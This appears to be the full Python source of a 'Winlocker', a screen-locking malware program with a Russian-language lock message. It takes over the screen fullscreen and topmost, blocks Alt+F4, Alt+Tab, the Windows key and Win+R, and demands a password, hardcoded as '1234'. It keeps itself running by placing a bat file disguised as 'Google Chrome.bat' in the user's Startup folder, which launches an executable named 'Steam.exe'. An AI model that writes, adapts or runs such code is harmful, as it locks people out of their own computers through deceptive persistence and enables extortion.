from tkinter import *
import keyboard
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui


USER_NAME = getpass.getuser()

window = Tk()
window.title("Winlocker")
window.geometry('1920x1080')
window['bg'] = 'black'


normal_width = 1920
normal_height = 1080


screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()


percentage_width = screen_width / (normal_width / 100)
percentage_height = screen_height / (normal_height / 100)


scale_factor = ((percentage_width + percentage_height) / 2) / 100



fontsize = int(20 * scale_factor)
minimum_size = 10
if fontsize < minimum_size:
       fontsize = minimum_size

fontsizeHding = int(72 * scale_factor)
minimum_size = 40
if fontsizeHding < minimum_size:
       fontsizeHding = minimum_size


default_style = ttk.Style()
default_style.configure('New.TButton', font=("Helvetica", fontsize))





def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
        bat_file.write(r'start C:\Users\%s\Downloads\Steam.exe' % USER_NAME)


keyboard.add_hotkey("alt+f4", lambda: None, suppress=True)
keyboard.add_hotkey("Win", lambda: None, suppress=True)
keyboard.add_hotkey("Win+tab", lambda: None, suppress=True)
keyboard.add_hotkey("alt+tab", lambda: None, suppress=True)
keyboard.add_hotkey("Win+r", lambda: None, suppress=True)



def fullscreen():
    window.attributes('-fullscreen', True, '-topmost', True)



def clicked():
    res = format(txt.get())
    if res == '1234':
        file_path = '/tmp/file.txt'
        file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
        os.remove(file_path)
        sys.exit()


add_to_startup("C:\\Users\\%s\\Downloads\\Steam.exe" % USER_NAME)
fullscreen()

# Создаем текст
txt_one = Label(window, text='WinLocker by PPMGB', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_two = Label(window, text='', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_three = Label(window, text='Ваш компьютер был заблокирован винлокером. введите пароль для получения доступа к компьютеру!', font=("Arial Bold", fontsize), fg='white', bg='black')


txt_one.grid(column=0, row=0)
txt_two.grid(column=0, row=0)
txt_three.grid(column=0, row=0)


txt_one.place(relx = .01, rely = .01)
txt_two.place(relx = .01, rely = .11)
txt_three.place(relx = .01, rely = .21)


txt = Entry(window)
btn = Button(window, text="Подтверждение", command=clicked)
txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)




window.mainloop()



